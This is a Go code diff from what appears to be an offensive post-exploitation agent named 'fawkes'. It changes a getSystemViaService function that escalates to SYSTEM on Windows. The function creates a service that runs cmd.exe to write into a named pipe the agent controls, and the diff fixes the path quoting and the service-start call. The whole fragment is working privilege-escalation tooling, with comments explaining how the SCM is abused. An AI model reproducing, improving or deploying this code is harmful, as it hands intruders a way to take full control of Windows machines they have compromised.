@@ -203,7 +203,7 @@ func getSystemViaService(oldIdentity string) structs.CommandResult {
 	if systemRoot == "" {
 		systemRoot = `C:\Windows`
 	}
-	binPath := fmt.Sprintf(`%s\System32\cmd.exe /c echo fawkes > %s`, systemRoot, pipeFullPath)
+	binPath := fmt.Sprintf(`"%s\System32\cmd.exe" /c echo fawkes > %s`, systemRoot, pipeFullPath)
 
 	scm, err := mgr.Connect()
 	if err != nil {
@@ -234,9 +234,8 @@ func getSystemViaService(oldIdentity string) structs.CommandResult {
 	}()
 
 	// Start the service — the SCM will run cmd.exe as SYSTEM which connects to our pipe
-	// Use low-level StartService which returns immediately (doesn't wait for RUNNING state)
-	startErr := windows.StartService(svcHandle.Handle, 0, nil)
-	_ = startErr // Expected to return an error eventually but the process still runs
+	startErr := svcHandle.Start()
+	// Expected to error because cmd.exe is not a real service, but it still runs the binary
 
 	// Wait for the pipe connection (overlapped I/O)
 	if !alreadyConnected {
